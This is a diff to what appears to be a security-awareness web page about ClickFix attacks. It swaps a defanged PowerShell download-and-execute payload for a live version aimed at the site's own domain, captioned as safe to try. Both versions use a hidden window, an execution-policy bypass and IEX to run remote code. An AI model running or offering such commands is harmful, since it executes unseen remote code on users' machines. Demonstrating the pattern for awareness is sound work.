@@ -90,9 +90,9 @@ import CodeBlock from "../components/CodeBlock.astro";
 				</p>
 
 				<CodeBlock
-					dangerous={true}
-					caption="Real ClickFix Payload Example (defanged)"
-					code={`powershell -windowstyle hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('hxxps://malicious-site[.]com/payload.ps1')"`}
+					dangerous={false}
+					caption="Benign Example (Try running this safely)"
+					code={`powershell -windowstyle hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('https://clickfix.fyi/static/example.ps1')"`}
 				/>
 
 				<div class="breakdown">
